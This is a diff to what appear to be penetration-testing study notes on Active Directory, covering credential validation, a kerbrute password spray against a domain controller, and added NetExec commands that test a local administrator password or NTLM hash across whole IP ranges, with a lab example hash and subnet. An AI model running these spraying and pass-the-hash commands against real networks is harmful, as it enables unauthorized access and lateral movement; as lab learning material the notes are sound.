@@ -43,4 +43,13 @@ sudo nxc smb <dcip> -u <username> -p <password> #To validate the credential we g
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 <userlist> <password>
 ```
 
-Each computer requires some sort of configuring before they are joined to a domain, and if we are able to obtain the password / hash for a local administrator account, their is a good chance that 
+Each computer requires some sort of configuring before they are joined to a domain, and if we are able to obtain the password / hash for a local administrator account, there is a chance that all computers have the same password for the local admin account, we can try to authenticate to all pcs in the network to see if we such is indeed the case:
+
+-Using NetExec:
+```
+sudo nxc smb --local-auth <ipranges> -u <accountname> -p <password> | grep +
+#Or if what we got is hash
+sudo nxc smb --local-auth <ipranges> -u <accountname> -H <hash> | grep +
+#Example:
+sudo nxc smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
+```
